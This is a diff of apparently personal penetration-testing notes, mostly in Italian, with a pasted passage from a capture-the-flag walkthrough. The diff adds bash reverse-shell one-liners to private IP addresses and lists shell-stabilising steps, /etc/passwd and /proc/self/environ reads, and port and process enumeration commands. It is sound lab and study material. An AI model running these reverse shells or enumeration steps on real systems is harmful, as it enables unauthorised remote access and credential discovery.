@@ -1,11 +1,11 @@
 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"
+
 
 python3 -c 'import pty;pty.spawn("/bin/bash");'
 export TERM=xterm
-control Z (stoppare mandare in background)
-
-ritorno su shell locale
-
+control Z (stoppare mandare in background)  ritorno su shell locale
 stty raw -echo;fg;
 
 
@@ -56,5 +56,35 @@ cat /proc/self/environ
 
 
 
+ss -lntp
+ps -ef | grep {PID}
 
-└─$ 
+Il comando ps aux è utilizzato per visualizzare una lista dettagliata dei processi in esecuzione sul sistema. La sua sintassi è:
+ps aux
+
+
+
+
+
+- cat /etc/passwd | grep sh$
+
+
+
+
+
+
+
+
+
+
+
+From this point on, we have complete access as the christine user on the target machine, and can start
+enumerating it for potential files or services that we can explore further. A crucial command at this point in
+time is the ss command, which stands for socket statistics , and can be used to check which ports are
+listening locally on a given machine.
+
+-l: Display only listening sockets.
+-t: Display TCP sockets.
+-n: Do not try to resolve service names.
+ss -tln
+con ss -tl poi possiamo risolvere il nome (che si sostituisce alla porta)
